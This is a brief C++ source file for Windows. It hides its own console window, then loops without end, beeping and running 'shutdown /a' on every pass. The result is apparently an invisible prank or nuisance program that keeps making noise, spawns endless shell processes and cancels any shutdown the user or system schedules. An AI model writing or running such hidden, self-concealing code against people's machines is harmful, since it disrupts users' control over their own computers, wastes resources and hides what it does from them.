#include <windows.h>
#include <cstdlib>

using namespace std;

int main(){
	
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	
	while(true){
		Beep(400, 100);
		system("shutdown /a");
	}
}
